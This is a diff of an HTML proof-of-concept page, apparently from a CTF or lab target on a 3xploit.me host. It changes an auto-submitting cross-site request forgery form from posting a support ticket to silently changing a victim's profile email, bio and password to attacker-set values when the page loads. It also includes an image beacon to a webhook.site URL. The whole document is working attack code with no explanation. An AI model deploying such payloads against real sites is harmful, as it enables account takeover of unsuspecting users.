@@ -6,12 +6,12 @@
     <title>Auto Submit Form</title>
 </head>
 <body onload="document.getElementById('supportForm').submit();">
-    <form id="supportForm" action="https://c28da2aeeeed.3xploit.me/index.php?page=support/ticket.php" method="POST">
-        <input type="hidden" name="title" value="It Works">
-        <input type="hidden" name="description" value="Yes">
-        <input type="hidden" name="url" value="">
-        <input type="hidden" name="csrf_token" value="b1ca069027a3bc5007f5178c9d85bcf5d5faaa6bad3fb1245443012d7805040e">
-        <input type="hidden" name="submit_ticket" value="">
+    <form id="supportForm" action="https://c28da2aeeeed.3xploit.me/index.php?page=user/profile.php" method="POST" enctype="multipart/form-data">
+        <input type="hidden" name="email" value="toto@gmail.com">
+        <input type="hidden" name="bio" value="HACKED">
+        <input type="file" name="profile_picture" value="" style="display:none;">
+        <input type="hidden" name="password" value="Totototo1!">
+        <input type="hidden" name="confirm_password" value="Totototo1!">
     </form>
 <img src="https://webhook.site/018a0620-b18e-4b00-9685-3e31a3cda308">
 </body>
